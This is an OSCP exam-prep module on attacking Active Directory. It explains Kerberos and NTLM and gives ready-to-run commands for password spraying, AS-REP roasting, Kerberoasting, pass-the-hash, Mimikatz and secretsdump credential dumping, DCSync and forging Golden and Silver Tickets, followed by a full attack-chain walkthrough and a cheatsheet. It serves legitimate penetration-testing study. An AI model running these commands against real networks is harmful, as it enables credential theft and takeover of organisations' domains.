# 13 — Active Directory Attacks

**This module is worth 40 points on the OSCP exam — 40% of your total score. There is NO partial credit for the AD set. You must compromise ALL three machines in the chain. If you skip AD, you need perfect scores on all three standalones PLUS bonus points. Learn AD. It's non-negotiable.**

---

## Understanding Active Directory

Before attacking AD, you need to understand what you're attacking. This isn't just "Windows networking" — it's a specific architecture with specific components that have specific weaknesses.

### What Active Directory actually is

Active Directory is a **centralized authentication and management system** for Windows networks. Instead of each machine having its own user database (local accounts), all users, passwords, groups, and policies are stored in one central database managed by a Domain Controller.

When you log into a domain-joined Windows machine, your credentials aren't checked against that machine — they're sent to the Domain Controller, which verifies them against the AD database. If they're valid, you get a Kerberos ticket that proves your identity to every other machine in the domain.

**Analogy:** Think of AD like a building's security system. Instead of each room having its own lock and key, there's a central security desk (the Domain Controller). You show your badge (credentials) to the security desk, and they give you an access card (Kerberos ticket) that opens every door you're authorized to use.

### Key components

**Domain Controller (DC):**
The server that runs Active Directory. It stores the database (NTDS.dit), handles authentication, and enforces group policies. Compromising the DC = game over for the entire domain. On the OSCP exam, the DC is usually the third machine in the AD chain — your ultimate target.

**NTDS.dit:**
The AD database file on the Domain Controller. Contains every username and password hash in the domain. If you can read this file (via DCSync or physical access), you own every account.

**Kerberos:**
The authentication protocol AD uses. Understanding Kerberos is critical because most AD attacks target how Kerberos works. Here's the simplified flow:

```
1. You type your password
2. Your machine sends an Authentication Service Request (AS-REQ) to the DC
3. DC checks your password → if valid, sends back a Ticket Granting Ticket (TGT)
4. Your machine stores the TGT
5. When you access a service (file share, web app, database):
   - Your machine sends the TGT to the DC with a Ticket Granting Service Request (TGS-REQ)
   - DC sends back a Service Ticket (TGS) for that specific service
   - You present the Service Ticket to the service
   - The service verifies the ticket and grants access
```

```
Client → AS-REQ (username + encrypted timestamp) → DC
Client ← AS-REP (TGT encrypted with krbtgt hash) ← DC

Client → TGS-REQ (TGT + requested service) → DC
Client ← TGS-REP (Service Ticket encrypted with service account's hash) ← DC

Client → Service Ticket → Target Service
Client ← Access granted ← Target Service
```

**Why this matters for attacks:**
- The TGT is encrypted with the `krbtgt` account's hash. If you get that hash → Golden Ticket → unlimited access.
- Service Tickets are encrypted with the service account's password hash. If you request one → Kerberoasting → offline cracking of the service account password.
- AS-REP is encrypted with the user's password hash. If pre-authentication is disabled → AS-REP Roasting → offline cracking.

**NTLM:**
An older authentication protocol that still exists alongside Kerberos. NTLM uses password hashes directly — if you have someone's NTLM hash, you can authenticate as them without knowing their actual password. This is Pass the Hash (PtH).

**LDAP (Lightweight Directory Access Protocol):**
The protocol used to query AD for information. You use LDAP to enumerate users, groups, computers, OUs, and other AD objects.

**Service Principal Name (SPN):**
An identifier that ties a service to an account in AD. When a service (like a SQL server) runs under a domain account, it registers an SPN. Kerberoasting targets accounts with SPNs because you can request their service ticket and crack it offline.

**Group Policy Objects (GPO):**
Policies pushed from the DC to domain machines. They control security settings, software installation, login scripts, etc. Sometimes GPOs contain credentials (Group Policy Preferences passwords — an old but still common finding).

---

## AD Attack Flow on the OSCP Exam

The AD set follows a predictable pattern:

```
MACHINE 1 (Member Server / Workstation)
├── Find initial access (web app, service exploit, weak creds)
├── Get a shell as a domain user
├── Enumerate AD from this foothold
├── Find credentials or a path to Machine 2
│
MACHINE 2 (Member Server)
├── Lateral movement (PtH, credential reuse, Kerberoasting result)
├── Get a shell
├── Escalate privileges locally
├── Dump more credentials
├── Find a path to the Domain Controller
│
MACHINE 3 (Domain Controller)
├── Lateral movement to DC (PtH, DCSync, Golden Ticket)
├── Get Domain Admin access
├── Dump proof.txt from all three machines
└── 40 POINTS
```

---

## Phase 1: AD Enumeration

### From Kali (before you have any credentials)

```bash
# Scan the entire AD network
nmap -sV -sC -oA ad_scan 192.168.X.0/24

# Identify the Domain Controller
# Look for these ports:
#   88  (Kerberos)    — DC always has this
#   389 (LDAP)        — DC always has this
#   636 (LDAPS)       — DC often has this
#   445 (SMB)         — most Windows machines
#   53  (DNS)         — DC often runs DNS
#   5985 (WinRM)      — remote management
```

When you see a machine with ports 88, 389, and 53 open — that's the Domain Controller.

```bash
# Try null session SMB enumeration
crackmapexec smb DC_IP -u '' -p ''
enum4linux -a DC_IP

# Try anonymous LDAP
ldapsearch -x -H ldap://DC_IP -b "" -s base namingContexts
# This tells you the domain name (e.g., DC=corp,DC=local → corp.local)

# If you get the domain name, enumerate further
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local"
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=group)" cn
```

### Enumerate users without credentials

```bash
# Kerbrute — enumerate valid usernames via Kerberos (fast, no lockout)
kerbrute userenum -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc DC_IP

# Why this works: Kerberos gives different error messages for valid vs invalid users
# Valid user:   KDC_ERR_PREAUTH_REQUIRED (user exists, needs password)
# Invalid user: KDC_ERR_C_PRINCIPAL_UNKNOWN (user doesn't exist)
```

### AS-REP Roasting (no credentials needed)

**What it is:** Some accounts have "Do not require Kerberos preauthentication" enabled. For these accounts, anyone can request an encrypted AS-REP message from the DC. The AS-REP is encrypted with the user's password hash — crack it offline.

**Why this is powerful:** You don't need ANY credentials. You just need a list of usernames (or enumerate them with kerbrute first).

```bash
# If you have a list of usernames
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep_hashes.txt

# If you have one valid credential, enumerate automatically
impacket-GetNPUsers corp.local/validuser:validpass -dc-ip DC_IP -request -format hashcat -outputfile asrep_hashes.txt

# Crack the hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Example output from GetNPUsers:**

```
$krb5asrep$23$svc_backup@CORP.LOCAL:abc123...very_long_hash...xyz789
```

This is the AS-REP hash for `svc_backup`. If you crack it, you know svc_backup's password.

### Password spraying (try one password against many users)

**What it is:** Try a single common password against every domain user. This avoids account lockout because you only try one password per user.

```bash
# Get a user list first (kerbrute, LDAP, or enum4linux)
# Then spray
crackmapexec smb DC_IP -u users.txt -p 'Password1!' --continue-on-success

# Kerbrute is faster and leaves fewer logs
kerbrute passwordspray -d corp.local users.txt 'Password1!' --dc DC_IP
```

**Passwords to try (most common in corporate environments):**

```
Password1!
Welcome1!
Company2026!        ← replace "Company" with the actual company name
Summer2026!
Winter2026!
Spring2026!
Fall2026!
P@ssw0rd
Passw0rd!
[CompanyName]1!
[CompanyName]2026!
[Season][Year]!
```

**Important:** Check the domain password policy first to avoid lockouts:

```bash
# Check password policy
crackmapexec smb DC_IP -u '' -p '' --pass-pol
# or
enum4linux -P DC_IP
```

Look for `Account Lockout Threshold`. If it's 0, you can spray freely. If it's 5, you can only try 4 passwords per user before lockout.

---

## Phase 2: Enumeration WITH Credentials

Once you have valid domain credentials (from initial access, spraying, or AS-REP roasting), your enumeration capability expands massively.

### CrackMapExec (the Swiss Army knife for AD)

```bash
# Verify credentials work
crackmapexec smb DC_IP -u 'validuser' -p 'validpass'
# Output: [+] corp.local\validuser:validpass → means valid

# Enumerate users
crackmapexec smb DC_IP -u 'validuser' -p 'validpass' --users

# Enumerate groups
crackmapexec smb DC_IP -u 'validuser' -p 'validpass' --groups

# Enumerate shares on all machines
crackmapexec smb 192.168.X.0/24 -u 'validuser' -p 'validpass' --shares

# Check for admin access on machines
crackmapexec smb 192.168.X.0/24 -u 'validuser' -p 'validpass'
# Output with (Pwn3d!) means you have local admin on that machine

# Execute commands
crackmapexec smb TARGET -u 'validuser' -p 'validpass' -x 'whoami'
crackmapexec smb TARGET -u 'validuser' -p 'validpass' -X 'Get-Process'  # PowerShell

# Dump SAM (if local admin)
crackmapexec smb TARGET -u 'validuser' -p 'validpass' --sam

# Dump LSA secrets
crackmapexec smb TARGET -u 'validuser' -p 'validpass' --lsa

# Dump NTDS.dit (if DC admin)
crackmapexec smb DC_IP -u 'domainadmin' -p 'password' --ntds
```

### BloodHound (visualize attack paths)

BloodHound is a tool that maps every relationship in Active Directory and finds the shortest path from where you are to Domain Admin. It's incredibly powerful — it sees paths that would take hours to find manually.

**Step 1: Collect data**

```bash
# From Kali with credentials
bloodhound-python -u 'validuser' -p 'validpass' -d corp.local -ns DC_IP -c all

# This creates JSON files in your current directory
ls *.json
```

If you have a shell on a domain-joined machine, use SharpHound instead:

```cmd
# On the Windows target
.\SharpHound.exe -c all
# Creates a ZIP file — transfer it to Kali
```

**Step 2: Import into BloodHound GUI**

```bash
# Start the BloodHound database
sudo neo4j start

# Start BloodHound
bloodhound

# Login (default: neo4j/neo4j — change on first login)
# Drag and drop the JSON files (or ZIP) into BloodHound
```

**Step 3: Run queries**

Click the hamburger menu → "Analysis" → choose pre-built queries:

```
"Find Shortest Paths to Domain Admins"   ← Most important query
"Find All Kerberoastable Users"
"Find AS-REP Roastable Users"
"Find Principals with DCSync Rights"
"Shortest Paths to High Value Targets"
"Find Computers with Unsupported OS"
```

**What to look for in BloodHound:**

```
Your user → MemberOf → Group → AdminTo → Target machine
Your user → HasSession → Machine → Admin of another machine
Your user → CanRDP → Machine
User with SPN → Kerberoastable → crack password → AdminTo → DC
```

BloodHound shows you the exact attack path. Each edge (arrow) is an exploit technique. Click on the edge and BloodHound explains how to exploit it.

### Kerberoasting (with credentials)

**What it is:** Any domain user can request a Service Ticket (TGS) for any service with an SPN. The ticket is encrypted with the service account's password hash. Request the ticket, take it offline, crack the hash — you have the service account's password.

**Why this is the #1 AD attack:** Service accounts often have weak passwords, high privileges, and their passwords rarely change. Many service accounts are Domain Admins or have admin access to critical servers.

```bash
# From Kali — find accounts with SPNs and request their tickets
impacket-GetUserSPNs corp.local/validuser:validpass -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt

# Example output:
# ServicePrincipalName    Name         MemberOf
# ----------------------  ----------   --------
# MSSQLSvc/sql01:1433     svc_sql      Domain Admins
# HTTP/web01              svc_web      
#
# $krb5tgs$23$*svc_sql$CORP.LOCAL$...very_long_hash...

# Crack the hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

If `svc_sql` cracks and it's a member of Domain Admins — you just won the domain.

```bash
# From Windows (using Rubeus)
.\Rubeus.exe kerberoast /outfile:tickets.txt

# Crack the same way
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
```

### LDAP enumeration with credentials

```bash
# All users with descriptions (descriptions often contain passwords!)
ldapsearch -x -H ldap://DC_IP -D "validuser@corp.local" -w "validpass" -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description

# Example finding:
# dn: CN=svc_backup,OU=Service Accounts,DC=corp,DC=local
# sAMAccountName: svc_backup
# description: Temp password: Backup2023!
# ← DEVELOPERS LEAVE PASSWORDS IN DESCRIPTIONS

# All computers
ldapsearch -x -H ldap://DC_IP -D "validuser@corp.local" -w "validpass" -b "DC=corp,DC=local" "(objectClass=computer)" cn operatingSystem

# Users with AdminCount=1 (admin accounts)
ldapsearch -x -H ldap://DC_IP -D "validuser@corp.local" -w "validpass" -b "DC=corp,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName
```

### SMB share hunting

```bash
# List shares on all machines with your creds
crackmapexec smb 192.168.X.0/24 -u 'validuser' -p 'validpass' --shares

# Connect to interesting shares
smbclient //TARGET/ShareName -U 'corp.local\validuser%validpass'

# Spider a share for sensitive files
crackmapexec smb TARGET -u 'validuser' -p 'validpass' -M spider_plus

# Specifically look for files with passwords
crackmapexec smb TARGET -u 'validuser' -p 'validpass' -M spider_plus --pattern "pass" "cred" "config" ".xml" ".ini" ".txt" ".bat" ".ps1"
```

**Files to look for in shares:**

```
*.ps1                 PowerShell scripts (often contain credentials)
*.bat / *.cmd         Batch scripts (same)
*.vbs                 VBScript (same)
*.xml                 Config files (GPP passwords, web.config)
*.ini                 Config files
*.config              .NET config files
*.txt                 Notes, documentation (sometimes passwords)
Groups.xml            Group Policy Preferences (contains encrypted password — easily decrypted)
Unattend.xml          Windows deployment config (contains passwords)
web.config            IIS config (connection strings with credentials)
```

### Group Policy Preferences (GPP) passwords

Old Group Policy Preferences stored encrypted passwords in XML files on the SYSVOL share. The encryption key was publicly disclosed by Microsoft — meaning ANYONE who can read SYSVOL can decrypt these passwords.

```bash
# Check for GPP passwords
crackmapexec smb DC_IP -u 'validuser' -p 'validpass' -M gpp_password

# Manual check
smbclient //DC_IP/SYSVOL -U 'corp.local\validuser%validpass'
smb: \> recurse on
smb: \> ls
# Look for Groups.xml, ScheduledTasks.xml, Services.xml, DataSources.xml

# Decrypt the password
gpp-decrypt "encrypted_password_from_xml"
```

---

## Phase 3: Lateral Movement

You have credentials (or hashes) for a user who has access to another machine. Now you move to that machine.

### Pass the Hash (PtH)

**What it is:** Use an NTLM hash directly to authenticate — no password cracking needed. NTLM authentication uses the hash, not the plaintext password. If you have the hash, you ARE that user.

```bash
# impacket-psexec (gives SYSTEM — most reliable)
impacket-psexec corp.local/administrator@TARGET -hashes aad3b435b51404ee:NTLM_HASH_HERE

# impacket-wmiexec (gives admin user — less noisy)
impacket-wmiexec corp.local/administrator@TARGET -hashes aad3b435b51404ee:NTLM_HASH_HERE

# impacket-smbexec (gives SYSTEM — uses service)
impacket-smbexec corp.local/administrator@TARGET -hashes aad3b435b51404ee:NTLM_HASH_HERE

# evil-winrm (if WinRM port 5985 is open)
evil-winrm -i TARGET -u administrator -H NTLM_HASH_HERE

# crackmapexec (check if hash works on multiple machines)
crackmapexec smb 192.168.X.0/24 -u administrator -H NTLM_HASH_HERE
# Machines showing (Pwn3d!) = you have admin access

# crackmapexec with command execution
crackmapexec smb TARGET -u administrator -H NTLM_HASH_HERE -x "whoami"
```

**Where the `aad3b435b51404ee` comes from:** That's the LM hash of an empty string. Modern Windows doesn't use LM hashes, so the LM part is always this value. The format is `LM_HASH:NTLM_HASH`, and impacket tools require both even though only the NTLM part matters.

### Pass the Hash with credentials (username:password)

```bash
# Same tools work with plaintext passwords
impacket-psexec corp.local/administrator:Password1\!@TARGET
impacket-wmiexec corp.local/administrator:Password1\!@TARGET
evil-winrm -i TARGET -u administrator -p 'Password1!'

# Note: escape special characters in passwords with \
# Password1! → Password1\! in the command line
```

### WinRM (port 5985)

```bash
# Check if WinRM is accessible
crackmapexec winrm TARGET -u username -p password

# Connect
evil-winrm -i TARGET -u username -p password

# With hash
evil-winrm -i TARGET -u username -H NTLM_HASH

# Upload/download files inside evil-winrm
*Evil-WinRM* PS> upload linpeas.exe C:\temp\linpeas.exe
*Evil-WinRM* PS> download C:\Users\admin\Desktop\proof.txt
```

### RDP (port 3389)

```bash
# Connect with credentials
xfreerdp /v:TARGET /u:username /p:password /cert-ignore /dynamic-resolution

# Connect with hash (if Restricted Admin mode is enabled)
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /cert-ignore

# From CrackMapExec, enable RDP if you have admin
crackmapexec smb TARGET -u admin -p pass -M rdp -o ACTION=enable
```

### PsExec (Impacket version)

```bash
# With password
impacket-psexec corp.local/admin:'Password1!'@TARGET

# With hash
impacket-psexec corp.local/admin@TARGET -hashes aad3b435:NTLM_HASH

# What PsExec does:
# 1. Connects to the target's ADMIN$ share
# 2. Uploads a service binary
# 3. Creates and starts a Windows service
# 4. The service runs cmd.exe and connects it back to you
# 5. You get a SYSTEM shell
```

---

## Phase 4: Dumping Credentials

Once you have admin access on a machine, dump all the credentials you can find.

### Mimikatz (the legendary credential dumping tool)

```cmd
# Upload mimikatz.exe to the target and run it
.\mimikatz.exe

# Enable debug privilege (required for most operations)
mimikatz# privilege::debug
# Output: Privilege '20' OK → you have admin access

# Dump all logged-on users' credentials
mimikatz# sekurlsa::logonpasswords
```

**What logonpasswords shows:**

```
Authentication Id : 0 ; 12345 (00000000:00003039)
Session           : Interactive from 1
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
        msv :
         [00000003] Primary
         * Username : administrator
         * Domain   : CORP
         * NTLM     : aad3b435b51404eeaad3b435b51404ee
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
         * Username : administrator
         * Domain   : CORP
         * Password : AdminP@ss123!
        wdigest :
         * Username : administrator
         * Domain   : CORP
         * Password : AdminP@ss123!
```

**Goldmine:** You get NTLM hashes AND sometimes plaintext passwords (through wdigest/tspkg). On older systems (Server 2012 and before), wdigest stores plaintext passwords in memory by default.

```cmd
# Other useful mimikatz commands

# Dump local SAM database
mimikatz# lsadump::sam

# Dump cached domain credentials
mimikatz# lsadump::cache

# Dump Kerberos tickets from memory
mimikatz# sekurlsa::tickets /export

# DCSync — pretend to be a DC and request password data (need specific AD rights)
mimikatz# lsadump::dcsync /domain:corp.local /user:administrator
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Impacket secretsdump (from Kali — no need to upload mimikatz)

```bash
# Dump credentials remotely with admin creds
impacket-secretsdump corp.local/admin:password@TARGET

# With hash
impacket-secretsdump corp.local/admin@TARGET -hashes aad3b435:NTLM_HASH

# Dump NTDS.dit from DC (ALL domain credentials)
impacket-secretsdump corp.local/domainadmin:password@DC_IP
```

**Output from secretsdump on a DC:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404ee:HASH_HERE:::
krbtgt:502:aad3b435b51404ee:HASH_HERE:::
svc_sql:1103:aad3b435b51404ee:HASH_HERE:::
john.doe:1104:aad3b435b51404ee:HASH_HERE:::
jane.smith:1105:aad3b435b51404ee:HASH_HERE:::
```

Every single domain account with its NTLM hash. Game over. You can now PtH as anyone.

### CrackMapExec credential dumping

```bash
# Dump SAM (local accounts)
crackmapexec smb TARGET -u admin -p password --sam

# Dump LSA secrets (cached credentials, service account passwords)
crackmapexec smb TARGET -u admin -p password --lsa

# Dump NTDS.dit from DC (all domain accounts)
crackmapexec smb DC_IP -u domainadmin -p password --ntds
```

---

## Phase 5: Domain Compromise

### DCSync Attack

**What it is:** Active Directory has a replication feature — Domain Controllers sync their databases with each other. DCSync abuses this by pretending to be a DC and requesting the password data for any account. You need specific AD permissions (Replicating Directory Changes), but Domain Admins have this by default, and sometimes other accounts do too.

```bash
# From Kali — dump a specific user's hash
impacket-secretsdump corp.local/user_with_dcsync_rights:password@DC_IP -just-dc-user administrator

# Dump the krbtgt hash (needed for Golden Ticket)
impacket-secretsdump corp.local/user_with_dcsync_rights:password@DC_IP -just-dc-user krbtgt

# Dump EVERYTHING
impacket-secretsdump corp.local/user_with_dcsync_rights:password@DC_IP
```

```cmd
# From Windows with Mimikatz
mimikatz# lsadump::dcsync /domain:corp.local /user:administrator
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

**How to know if you have DCSync rights:** BloodHound shows this. Or check manually:

```bash
# BloodHound query: "Find Principals with DCSync Rights"
# Or check with PowerShell on a domain-joined machine:
# Look for accounts with "Replicating Directory Changes" and "Replicating Directory Changes All" permissions
```

### Golden Ticket

**What it is:** A forged Kerberos TGT that makes you Domain Admin. The TGT is encrypted with the `krbtgt` account's hash. If you have that hash (from DCSync), you can forge a TGT for ANY user with ANY group memberships — including Domain Admin.

```bash
# Step 1: Get the krbtgt hash (via DCSync)
impacket-secretsdump corp.local/admin:password@DC_IP -just-dc-user krbtgt

# Step 2: Get the domain SID
# From crackmapexec or ldapsearch output, or:
impacket-lookupsid corp.local/admin:password@DC_IP

# Step 3: Create the Golden Ticket
impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXXXXXX -domain corp.local administrator

# Step 4: Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@DC_IP -k -no-pass
# You're now SYSTEM on the DC — no password needed
```

### Silver Ticket

**What it is:** Like a Golden Ticket but for a specific service instead of the entire domain. Forged using the service account's hash instead of krbtgt. Useful when you have a service account hash but not krbtgt.

```bash
impacket-ticketer -nthash SERVICE_ACCOUNT_HASH -domain-sid S-1-5-21-XXXXXXX -domain corp.local -spn MSSQLSvc/sql01.corp.local:1433 administrator

export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k corp.local/administrator@sql01.corp.local
```

---

## Complete AD Attack Chain Example

Here's a realistic OSCP AD chain walkthrough:

```
STEP 1: SCAN THE NETWORK
$ nmap -sV -sC 192.168.X.0/24
Found:
  192.168.X.10 — DC01 (ports 53,88,135,139,389,445,636,3389,5985)
  192.168.X.20 — WEB01 (ports 80,135,139,445)
  192.168.X.30 — SQL01 (ports 135,139,445,1433,5985)

STEP 2: ENUMERATE WEB01 (the likely foothold)
$ gobuster dir -u http://192.168.X.20 -w /usr/share/wordlists/dirb/common.txt
Found: /login, /admin, /uploads
$ curl http://192.168.X.20/login → login page
$ Try SQL injection → authentication bypass → admin panel
$ Upload web shell → reverse shell as IIS user

STEP 3: ENUMERATE AD FROM WEB01
$ whoami → corp\iis_svc
$ whoami /priv → SeImpersonatePrivilege
$ .\PrintSpoofer64.exe -i -c cmd → SYSTEM on WEB01
$ .\mimikatz.exe → sekurlsa::logonpasswords
Found: corp\admin_web : WebAdmin2026!

STEP 4: CHECK IF CREDS WORK ON OTHER MACHINES
$ crackmapexec smb 192.168.X.0/24 -u admin_web -p 'WebAdmin2026!'
  192.168.X.20 [+] corp\admin_web:WebAdmin2026! (Pwn3d!)  ← already here
  192.168.X.30 [+] corp\admin_web:WebAdmin2026! (Pwn3d!)  ← admin on SQL01!
  192.168.X.10 [+] corp\admin_web:WebAdmin2026!             ← valid but not admin

STEP 5: MOVE TO SQL01
$ evil-winrm -i 192.168.X.30 -u admin_web -p 'WebAdmin2026!'
$ whoami → corp\admin_web (local admin)
$ .\mimikatz.exe → sekurlsa::logonpasswords
Found: corp\svc_sql : SqlService1! (this is a service account)

STEP 6: CHECK SVC_SQL'S PRIVILEGES
$ crackmapexec smb DC_IP -u svc_sql -p 'SqlService1!'
$ bloodhound-python -u svc_sql -p 'SqlService1!' -d corp.local -ns DC_IP -c all
BloodHound shows: svc_sql has DCSync rights!

STEP 7: DCSYNC → GAME OVER
$ impacket-secretsdump corp.local/svc_sql:'SqlService1!'@DC_IP
Administrator:500:aad3b435:NTLM_HASH_HERE:::
krbtgt:502:aad3b435:KRBTGT_HASH:::

STEP 8: ACCESS THE DC
$ impacket-psexec corp.local/administrator@DC_IP -hashes aad3b435:NTLM_HASH
C:\> type C:\Users\Administrator\Desktop\proof.txt
→ 40 POINTS
```

---

## AD Cheatsheet

```
ENUMERATION (no creds)
======================
nmap -sV -sC -p 53,88,135,139,389,445,636,3389,5985 TARGET
crackmapexec smb DC_IP -u '' -p ''
enum4linux -a DC_IP
kerbrute userenum -d corp.local users.txt --dc DC_IP
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat

ENUMERATION (with creds)
========================
crackmapexec smb DC_IP -u user -p pass --users --groups --shares
bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c all
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request
ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w pass -b "DC=corp,DC=local"

PASSWORD ATTACKS
================
crackmapexec smb DC_IP -u users.txt -p 'Password1!' --continue-on-success
hashcat -m 18200 asrep.txt rockyou.txt          AS-REP Roast
hashcat -m 13100 kerberoast.txt rockyou.txt     Kerberoast
hashcat -m 1000 ntlm.txt rockyou.txt            NTLM hashes

LATERAL MOVEMENT
================
impacket-psexec corp.local/user:pass@TARGET
impacket-psexec corp.local/user@TARGET -hashes LM:NTLM
impacket-wmiexec corp.local/user:pass@TARGET
evil-winrm -i TARGET -u user -p pass
evil-winrm -i TARGET -u user -H NTLM_HASH
crackmapexec smb TARGET -u user -p pass -x "whoami"

CREDENTIAL DUMPING
==================
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
mimikatz# lsadump::dcsync /domain:corp.local /user:administrator
impacket-secretsdump corp.local/admin:pass@TARGET
crackmapexec smb TARGET -u admin -p pass --sam --lsa

DOMAIN COMPROMISE
=================
impacket-secretsdump corp.local/admin:pass@DC_IP              DCSync
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain corp.local admin  Golden Ticket
export KRB5CCNAME=admin.ccache
impacket-psexec corp.local/admin@DC_IP -k -no-pass            Use Golden Ticket
```

---

## Lab Practice Resources

You can't easily set up a full AD lab with your current VMs (you'd need Windows Server). Instead:

**HackTheBox AD machines (in order of difficulty):**
1. **Active** — GPP passwords + Kerberoasting (start here)
2. **Forest** — AS-REP Roasting + BloodHound + DCSync
3. **Sauna** — AS-REP Roasting + WinRM + DCSync
4. **Cascade** — LDAP enumeration + credential hunting
5. **Resolute** — Password spraying + DnsAdmin privesc
6. **Monteverde** — Azure AD + credential reuse

**TryHackMe AD rooms:**
1. Active Directory Basics (free)
2. Attacktive Directory (free)
3. Exploiting Active Directory (subscriber)
4. AD Certificate Templates (subscriber)

**Build your own AD lab:**
1. Download Windows Server 2019/2022 evaluation ISO (free 180 days from Microsoft)
2. Install as a VM, promote to Domain Controller
3. Join your Windows 11 VM to the domain
4. Create users, groups, service accounts, misconfigurations
5. Practice the full attack chain

---

## Exam Tips for Active Directory

1. **Do the AD set FIRST.** It's worth 40 points and you need to be fresh and focused for it. Start here.

2. **BloodHound is not optional.** Collect data as soon as you have credentials. The shortest path to Domain Admin is often non-obvious and BloodHound finds it instantly.

3. **Try every credential on every machine.** Credential reuse is the most common lateral movement technique. `crackmapexec smb 192.168.X.0/24 -u user -p pass` tests all machines at once.

4. **Kerberoast early.** As soon as you have any domain credentials, run GetUserSPNs. If a service account cracks and is Domain Admin, you're done.

5. **Check user descriptions in LDAP.** Admins put temporary passwords in user descriptions and forget to remove them. This is a real finding in real environments.

6. **If you're stuck, enumerate more shares.** SMB shares often contain scripts, configs, and documents with credentials. Spider every share you can access.

7. **Don't forget local privesc.** After getting a shell on a domain machine, escalate locally first (SeImpersonate → PrintSpoofer → SYSTEM → Mimikatz). Local admin access unlocks credential dumping.

8. **The chain must be complete.** No partial credit. If you can't get from Machine 1 to Machine 2, that's 0 points for the entire AD set. Spend the time to find the path.
